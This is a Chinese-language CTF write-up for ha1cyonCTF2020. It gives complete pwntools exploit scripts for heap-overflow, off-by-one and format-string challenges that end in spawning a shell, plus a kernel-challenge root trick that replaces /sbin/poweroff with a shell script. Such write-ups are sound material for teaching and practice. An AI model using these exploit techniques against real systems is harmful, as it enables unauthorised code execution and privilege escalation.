# ha1cyonCTF2020

## 前言

比赛结束了，虽然是新生赛，不过是自己第一次AK掉pwn，还是蛮开心的，感谢Pwn题的出题人，kernel题有一点问题，所以我拿两个非预期打的，本来其实想就预期做的，但是自己实在太懒了(摊手.jpg)
ID         : z3al
联系方式(QQ): 1002992920

## badguy

无泄漏的heap题，改stdout，因为edit有堆溢出，可以轻松构造overlapping chunk，使得fastbin和Unsorted bin重叠，注意要edit一次修复size然后分配到stdout附近的fake chunk最后泄露地址，用同样方法get shell。

```py
#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='info)
context.terminal = ['tmux','split','-h']
debug = 0
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./pwn')
else:
    p = remote('ha1cyon-ctf.fun',30009)

def Add(idx,sz,content='a'):
    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil("Index :")
    p.sendline(str(idx))
    p.recvuntil("size: ")
    p.sendline(str(sz))
    p.recvuntil("Content:")
    p.send(content)

def Delete(index):
    p.recvuntil('>> ')
    p.sendline('3')
    p.recvuntil("Index :")
    p.sendline(str(index))

def Edit(idx,sz,content='a'):
    p.recvuntil('>> ')
    p.sendline('2')
    p.recvuntil("Index :")
    p.sendline(str(idx))
    p.recvuntil("size: ")
    p.sendline(str(sz))
    p.recvuntil("content: ")
    p.send(content)

def exp():
    #leak libc
    Add(0,0x68)
    Add(1,0x20)
    Add(2,0x68)
    Add(3,0x68)
    Add(4,0x68,p64(0x21)*7)
    Delete(2)
    Edit(0,0x70,'a'*0x60+p64(0)+p64(0x111))

    Delete(1)

    Add(1,0x20)

    Add(2,0x48,'\xdd\x25')

    Edit(1,0x30,'a'*0x20+p64(0)+p64(0x71))

    Add(5,0x68,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00')

    Add(6,0x68,'\x00'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00')
    p.recvuntil("\x00\x18\xad\xfb")
    p.recvn(0x18+4)
    libc_addr = u64(p.recvn(8))
    print hex(libc_addr)
    libc_base = libc_addr - (0x7ffff7dd2600-0x7ffff7a0d000)
    libc.address = libc_base
    log.success("libc base => " + hex(libc_base))
    Delete(4)
    Edit(3,0x80,'a'*0x68+p64(0x71)+p64(libc.sym['__malloc_hook']-0x23))

    Add(4,0x68)
    shell_addr = libc_base + gadgets[3]
    #gdb.attach(p)
    Add(7,0x68,'\x00'*0x13+p64(shell_addr))

    p.recvuntil('>> ')
    p.sendline('1')
    p.recvuntil("Index :")
    p.sendline(str(8))
    p.recvuntil("size: ")
    p.sendline(str(17))


while True:
    try:
        exp()
        p.sendline("cat /flag*")
        p.interactive()
        p.close()
    except:
        p.close()
    if debug:
        p = process('./pwn')
    else:
        p = remote('ha1cyon-ctf.fun',30009)

```

## level2

输入在bss上，考虑找栈上的二级指针部分写返回地址为one_gadget(__libc_start_main)前半部分不需要管

```py
#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x4f2c5,0x4f322,0x10a38c]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./pwn')
else:
    p = remote('f.buuoj.cn',20173)

def exp():
    #leak libc & stack
    sleep(0.01)
    p.send("+%15$p-")
    p.recvuntil("+")
    retn_addr = int(p.recvuntil('-',drop=True),16) - (0x7fffffffe440-0x00007fffffffe368)
    log.success("stack addr => " + hex(retn_addr))
    sleep(0.01)
    p.send("+%7$p-\x00")
    p.recvuntil("+")
    libc_base = int(p.recvuntil('-',drop=True),16) - 231 - libc.sym['__libc_start_main']
    log.success("libc base => " + hex(libc_base))
    shell_addr = libc_base + gadgets[0]
    log.success("shell addr => " + hex(shell_addr))
    #hajack retn addr
    payload = "%"+str(retn_addr&0xffff)+"c%9$hn\x00"
    payload = payload.ljust(0x64,'\x00')
    sleep(0.01)
    p.send(payload)
    payload = "%"+str(shell_addr&0xff)+"c%35$hhn\x00"
    payload = payload.ljust(0x64,'\x00')
    sleep(0.01)

    p.send(payload)
    #twice
    payload = "%"+str((retn_addr+1)&0xff)+"c%9$hhn\x00"
    payload = payload.ljust(0x64,'\x00')
    sleep(0.01)
    p.send(payload)
    payload = "%"+str((shell_addr&0xffff)>>8)+"c%35$hhn\x00"
    payload = payload.ljust(0x64,'\x00')
    sleep(0.01)

    p.send(payload)
    #three
    payload = "%"+str((retn_addr+2)&0xff)+"c%9$hhn\x00"
    payload = payload.ljust(0x64,'\x00')
    sleep(0.01)
    p.send(payload)

    payload = "%"+str((shell_addr&0xffffff)>>16)+"c%35$hhn\x00"
    payload = payload.ljust(0x64,'\x00')
    sleep(0.01)
    p.send(payload)
    raw_input()
    p.send("66666666".ljust(0x64,'\x00'))


    p.interactive()

exp()

```

## easy_heap

edit处有off-by-one可以构造Overlapping chunk，只能add两种类型的chunk，需要先改sz，释放7个small bin的块到tcache再泄露地址，然后利用堆块重叠+edit修改atoi@got为system。

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if debug:
    p = process('./pwn')
else:
    p = remote('f.buuoj.cn',20173)

def Add(size,content="a"):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil("Size of Heap(0x10 or 0x20 only) : ")
    p.sendline(str(size))
    p.recvuntil("Content:")
    p.send(content)

def Show(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil("Index :")
    p.sendline(str(index))

def Delete(index):
    p.recvuntil('Your choice :')
    p.sendline('4')
    p.recvuntil("Index :")
    p.sendline(str(index))

def Edit(index,content):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil("Index :")
    p.sendline(str(index))
    p.recvuntil("Content: ")
    p.send(content)


bss_lis = 0x6020a0

def exp():
    #leak libc
    Add(0x38)#0
    Add(0x38)#1
    for i in range(7):
        Add(0x38,p64(0x21)*7)#[2,9]
    for i in range(7):
        Edit(i,'a'*0x30+p64(0)+'\xa1')
    for i in range(1,8):
        Delete(i)
    Delete(0)
    Delete(9)
    #
    for i in range(7):
        Add(0x18,p64(0x21)*3)#[0,6]
    Edit(0,'a'*0x10+p64(0)+'\xa1')

    Delete(1)#now 1 == 0xa0 = 0x18

    Add(0x38,'a'*8)#1
    Add(0x18,'a'*8)#7

    Show(7)

    p.recvuntil("a"*8)
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 96 - 0x10 - libc.sym['__malloc_hook']
    log.success("libc base => " + hex(libc_base))
    #get shell
    Edit(7,p64(8)+p64(elf.got['atoi']))

    Edit(1,p64(libc_base+libc.sym['system']))
    gdb.attach(p)



    p.interactive()

exp()

```

## ezdrv

把/sbin/poweroff删除，然后echo `#!/bin/h\n/bin/sh` > `/sbin/poweroff`，chmod +x `/sbin/poweroff`再exit就可以得到root shell了，这个原理是退出的时候会以root权限执行`poweroff`，所以直接提权了。

## PWN2Learn

同上，是一样的问题。